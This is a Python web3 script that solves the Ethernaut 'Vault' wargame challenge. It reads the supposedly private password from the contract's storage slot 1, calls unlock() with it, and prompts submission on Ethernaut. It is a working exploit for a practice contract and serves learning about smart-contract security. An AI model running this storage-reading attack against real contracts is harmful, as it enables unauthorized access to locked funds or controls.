import web3
import solcx
from dotenv import load_dotenv
import os

load_dotenv()

# load variables from .env
wallet_private_key = os.getenv("WALLET_PRIVATE_KEY")
wallet_address = os.getenv("WALLET_ADDRESS")
w3 = web3.Web3(web3.HTTPProvider(os.getenv("WEB3_PROVIDER")))

contract_address = "0xCDF9aE5446cF65eA5E48D53Ff3252608cBB735c8"

def read_contract_return_abi(contract_file, contract_address, w3):
    with open(contract_file, "r") as f:
        contract_source = f.read()
        f.close()

    # install solc version 0.8.0 in case it's not installed.
    solcx.install_solc("0.8.0")
    solcx.set_solc_version("0.8.0")
    compiled_sol = solcx.compile_source(contract_source)

    # get abi from compiled_sol, <stdin> is the placeholder for the file name we chose.
    abi = compiled_sol["<stdin>:Vault"]["abi"]

    contract = w3.eth.contract(address=contract_address, abi=abi)

    return contract

def sign_and_send_transaction(w3, wallet_private_key, tx):
    signed_tx = w3.eth.account.sign_transaction(tx, wallet_private_key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    return tx_receipt

def main():
    vault = read_contract_return_abi("./Vault.sol", contract_address, w3)

    # slot 0 --> boolean "locked"
    # slot 1 --> bytes32 "password"
    password = w3.eth.get_storage_at(contract_address, 1).hex()

    print(f"Password: {password}",)

    unlock_tx_fields = {
        "nonce": w3.eth.get_transaction_count(wallet_address, "pending"),
        "gas": 300_000,
        "gasPrice": w3.to_wei("5", "gwei"),
    }
    # password is bytes32, so we need to encode it
    unlock_tx = vault.functions.unlock(password).build_transaction(unlock_tx_fields)

    print("Attempting to unlock vault...")

    unlock_tx_receipt = sign_and_send_transaction(w3, wallet_private_key, unlock_tx)

    if unlock_tx_receipt["status"] == 1:
        print("Vault unlocked! Try submitting on Ethernaut.")

if __name__ == "__main__":
    main()